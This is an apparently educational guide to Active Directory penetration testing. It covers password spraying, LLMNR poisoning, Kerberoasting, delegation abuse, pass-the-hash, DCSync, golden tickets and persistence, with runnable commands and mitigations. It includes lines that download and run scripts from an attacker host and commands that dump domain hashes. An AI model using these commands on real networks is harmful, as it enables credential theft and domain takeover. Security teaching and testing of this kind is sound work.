This guide provides a detailed overview of Active Directory (AD) exploitation techniques for educational and ethical security research purposes. **Under no circumstances should you perform these actions on any network or system for which you do not have explicit, written authorization.**

---

### **Part 1: Introduction & Methodology** 🗺️

Active Directory is the centralized identity and access management system for most organizations. Compromising it means controlling the entire network. AD security testing is a cyclical process of leveraging misconfigurations to move from zero access to full domain control.

**The Attack Lifecycle:**
1.  **Initial Access:** Gain a foothold on the network, often without any domain credentials.
2.  **Enumeration:** With a foothold, map the AD environment to find users, computers, groups, and policies.
3.  **Local Privilege Escalation:** Escalate privileges on the initial compromised machine to gain more access (e.g., to dump credentials from memory).
4.  **Lateral Movement & Domain Escalation:** Use credentials and misconfigurations to move across the network and escalate privileges within the domain.
5.  **Domain Dominance & Persistence:** Achieve control over a Domain Controller (DC) and create backdoors to maintain access.

---

### ## Part 2: Initial Access & Gaining a Foothold

Before you can attack AD, you need to get on the network and find a valid set of credentials.

### ### Password Spraying

This attack avoids account lockouts by trying one or two common passwords (e.g., `Spring2025!`, `Password123`) against a large list of usernames.

* **What to Look For:** A list of valid usernames, which can often be guessed from email formats or enumerated via protocols like SMTP.
* **Tools & Commands:**
    * **SprayingToolkit:** `python3 sprayingtoolkit.py -u users.txt -p 'Spring2025!' -d domain.local -t rdp`
    * **CrackMapExec:** `cme smb <Target_IP_Range> -u users.txt -p 'Password123' --continue-on-success`

### ### LLMNR/NBT-NS Poisoning

**Link-Local Multicast Name Resolution (LLMNR)** and **NetBIOS Name Service (NBT-NS)** are legacy protocols Windows uses to resolve hostnames when DNS fails. They are unauthenticated and operate via broadcast. An attacker can listen for these broadcasts and respond, pretending to be the requested resource.

* **How it Works:**
    1.  A user tries to access a non-existent network share (e.g., `\\filesharez`). DNS fails.
    2.  The user's PC broadcasts, "Who is `filesharez`?"
    3.  The attacker's machine responds, "I am `filesharez`! Authenticate to me."
    4.  The victim's machine sends its NTLMv2 hash to the attacker.
* **Tools & Commands:**
    * **Responder:** The primary tool for this attack. It listens, poisons, and saves the captured hashes.
        ```bash
        # On your attacker machine (e.g., Kali Linux)
        sudo responder -I <Your_Network_Interface> -v
        ```
    * **Cracking the Hash:** The captured NTLMv2 hash can be cracked offline with Hashcat.
        ```bash
        # Hashcat mode 5600 is for NTLMv2
        hashcat -m 5600 hashes.txt /path/to/wordlist.txt
        ```
* **Mitigation:** **Disable LLMNR and NBT-NS** via Group Policy. This is one of the most important security baselines for an internal network.

---

### ## Part 3: In-Depth Enumeration

Once you have credentials, the goal is to map the entire domain.

### ### PowerView

A powerhouse PowerShell tool for AD enumeration. It's part of the PowerSploit framework.

* **Core Commands:**
    ```powershell
    # Import the module
    IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>/PowerView.ps1')

    # Find interesting users and groups
    Get-NetUser | select samaccountname, description, pwdlastset, lastlogon
    Get-NetGroup "Domain Admins" | Get-NetGroupMember
    Get-NetUser -SPN | select samaccountname, serviceprincipalname # Find Kerberoastable users

    # Find computers and domain controllers
    Get-NetComputer -FullData | select operatingsystem, dnshostname
    Get-NetDomainController

    # Enumerate GPOs and look for sensitive info
    Get-NetGPO | select displayname
    Get-GPOReport -All -ReportType Html -Path C:\tmp\gpo_report.html
    ```

### ### BloodHound & SharpHound

This is the most effective way to visualize AD attack paths. `SharpHound` is the collector, and BloodHound is the GUI.

* **Collection with SharpHound:**
    ```powershell
    # Run from a compromised host (PowerShell)
    IEX (New-Object Net.WebClient).DownloadString('http://<attacker_ip>/SharpHound.ps1')
    Invoke-BloodHound -CollectionMethod All -Domain <your_domain> -ZipFileName loot.zip

    # Or run the executable
    SharpHound.exe --collectionmethod All --domain <your_domain> --zipfilename loot.zip
    ```
* **Analysis:** Drag and drop the generated `loot.zip` file into the BloodHound GUI. Use the built-in queries to find:
    * Shortest Paths to Domain Admin
    * Find all Kerberoastable Users
    * Find Users with DCSync Rights



---

### ## Part 4: Domain Escalation & Lateral Movement

With enumeration data, you can now execute attacks to escalate your privileges.

### ### Kerberoasting (In-Depth)

* **Objective:** Obtain the password hash of a service account.
* **Tools & Commands:**
    * **Impacket (`GetUserSPNs.py`):**
        ```bash
        impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER> -request
        ```
    * **Rubeus:**
        ```powershell
        Rubeus.exe kerberoast /outfile:hashes.txt
        ```
    * **Cracking with Hashcat (Mode 13100 for Kerberos 5 TGS-REP):**
        ```bash
        hashcat -m 13100 -a 0 hashes.txt /path/to/wordlist.txt
        ```
* **Mitigation:** Use strong (25+ character) passwords or gMSAs for service accounts. Monitor for unusual service ticket requests.

### ### AS-REP Roasting (In-Depth)

* **Objective:** Obtain the password hash of a user with Kerberos preauthentication disabled.
* **Tools & Commands:**
    * **Impacket (`GetNPUsers.py`):**
        ```bash
        impacket-GetNPUsers <DOMAIN>/ -usersfile <list_of_users> -format hashcat -outputfile hashes.txt
        ```
    * **Rubeus:**
        ```powershell
        Rubeus.exe asreproast /outfile:hashes.txt
        ```
    * **Cracking with Hashcat (Mode 18200 for Kerberos 5 AS-REP):**
        ```bash
        hashcat -m 18200 -a 0 hashes.txt /path/to/wordlist.txt
        ```
* **Mitigation:** Enforce Kerberos preauthentication for all user accounts (this is the default and should not be changed).

### ### Delegation Attacks

Delegation allows a service to impersonate a user to access other resources on their behalf. If misconfigured, it's a powerful attack vector.

* **Unconstrained Delegation:** A server with this enabled can impersonate **any user** that authenticates to it (including a Domain Admin who might check on it) and access **any resource** as that user.
    1.  **Find:** Use PowerView: `Get-NetComputer -Unconstrained`
    2.  **Exploit:** Coerce a privileged user to authenticate to the compromised server (e.g., using `PetitPotam` or social engineering). Use `Mimikatz` on the server to catch the forwarded Kerberos TGT.
* **Constrained Delegation (KCD & RBCD):**
    * **KCD:** A server can impersonate users, but only to a specific list of allowed services. An attacker who compromises the server can use tools like `Rubeus` to get a service ticket for an allowed service in the name of a user.
    * **Resource-Based KCD:** The permission is on the *end resource*, not the intermediary server. If an attacker controls a computer account, they can configure RBCD to allow it to be impersonated by another account they control, effectively giving them access to the resource.
* **Mitigation:** Avoid Unconstrained Delegation wherever possible. Tightly scope Constrained Delegation and audit computer objects that have delegation permissions.

### ### Lateral Movement Techniques

Once you have credentials (a password, NTLM hash, or Kerberos ticket), you can use them to move to other machines.

* **Pass-the-Hash (PtH):** Use a user's NTLM hash instead of their password to authenticate. This works with many Windows protocols.
    * **Tool:** `impacket-psexec`: `impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes <LM_HASH>:<NT_HASH>`
* **Pass-the-Ticket (PtT):** Use a stolen or forged Kerberos ticket to authenticate.
    * **Tool:** `Mimikatz` (to inject the ticket) and `Rubeus` (for a more advanced workflow).
        ```powershell
        # On your compromised host
        mimikatz.exe "kerberos::ptt ticket.kirbi"
        ```
* **WinRM:** If you have credentials for a user in the "Remote Management Users" group, you can get a remote shell.
    * **Tool:** `impacket-wmiexec`: `impacket-wmiexec <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>`

---

### ## Part 5: Domain Dominance & Persistence

The final stage: taking full control and ensuring you can't be kicked out.

### ### DCSync

This is not an exploit, but an abuse of legitimate replication rights. An account with DCSync permissions can ask a DC for any user's password hash.

* **Objective:** Dump all password hashes from the domain without running code on a DC.
* **Tool (`Mimikatz`):** The command impersonates a Domain Controller and requests the NTLM hash of the `krbtgt` account.
    ```powershell
    # Requires Domain Admin (or equivalent) privileges
    mimikatz.exe "lsadump::dcsync /domain:<your.domain> /user:krbtgt"
    ```
* **Mitigation:** Tightly control and monitor who has replication permissions on the domain root.

### ### Golden Ticket Attack (In-Depth)

* **Objective:** Forge a master Kerberos ticket to become any user at any time.
* **Prerequisites:** You need the `krbtgt` account's NTLM hash (from a DCSync attack), the domain name, and the domain SID.
* **Tool (`Mimikatz`):**
    ```powershell
    # kerberos::golden /user:<User_To_Impersonate> /domain:<Domain_Name> /sid:<Domain_SID> /krbtgt:<KRBTGT_HASH> /ptt
    # Example:
    kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-..... /krbtgt:deadbeef.... /ptt
    ```
    After running this, your current shell has the permissions of a Domain Admin.

### ### Silver Ticket Attack

Similar to a Golden Ticket, but it forges a **service ticket (TGS)** for a *specific service* (e.g., `CIFS` for file shares, `HTTP` for a web server) on a specific machine. This is stealthier as it doesn't require the `krbtgt` hash, only the NTLM hash of the service's computer or user account.

### ### AdminSDHolder Persistence

An attacker with Domain Admin rights can add their backdoor account to the ACL of the `AdminSDHolder` container. Every ~60 minutes, the SDPropagation process will ensure this backdoor account gets administrative rights over all protected objects, reverting any changes a defender might make.

---

### ## Part 6: Key Defensive Principles

* **Tiered Administration Model:** Separate administrative accounts. A workstation admin should not be able to log into a Domain Controller.
* **Principle of Least Privilege:** Users, services, and computers should only have the absolute minimum permissions they need.
* **Disable Legacy Protocols:** Turn off LLMNR, NBT-NS, and SMBv1.
* **Credential Hardening:** Use long passwords/passphrases. Deploy Windows Defender Credential Guard to protect LSA.
* **Monitoring:** Monitor for suspicious activity like DCSync from non-DCs, massive service ticket requests (Kerberoasting), and changes to privileged group memberships or GPOs.
